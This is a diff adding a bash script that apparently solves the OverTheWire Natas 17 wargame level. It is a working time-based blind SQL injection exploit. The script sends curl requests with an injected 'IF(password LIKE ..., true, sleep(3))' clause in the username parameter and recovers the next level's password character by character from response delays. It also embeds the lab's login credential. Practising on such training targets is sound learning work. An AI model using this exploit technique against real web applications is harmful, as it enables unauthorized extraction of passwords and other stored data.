@@ -1,0 +1,48 @@
+#!/bin/bash
+
+main () 
+{
+	char="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+	pass=""
+
+	for i in $(seq 1 32)
+	do
+		for c in $(fold -w1 <<< $char)
+		do
+			r=$(check "$pass$c")
+			# echo $r;
+			echo -en "password: $pass$c" "\r"
+			if [ "yes" = "$r" ]; then
+				pass="$pass$c"	
+				break
+			fi
+			# echo $c $i
+		done
+		# break
+	done
+
+
+	echo "password: $pass"
+}
+
+check ()
+{
+	delay=3
+	start=$(date +%s)
+	
+	result=$(curl --silent --user natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw http://natas17.natas.labs.overthewire.org/?username=natas18%22+AND+IF\(password+LIKE+binary+%27$1%%27,true,sleep\($delay\)\)%20--%20x)
+	
+	# result=$(curl --silent --user natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw http://natas17.natas.labs.overthewire.org/?username=natas18%22+AND+IF\(password+LIKE+binary+%27$1%%27,true,sleep\(5\)\)%20--%20x)
+
+	end=$(date +%s)
+	elapsed=$(($end-$start))
+	if [ "$elapsed" -lt "$delay" ]; then
+		echo "yes"
+	else
+		echo "no"	
+	fi
+}
+
+main
+
+#check "N"
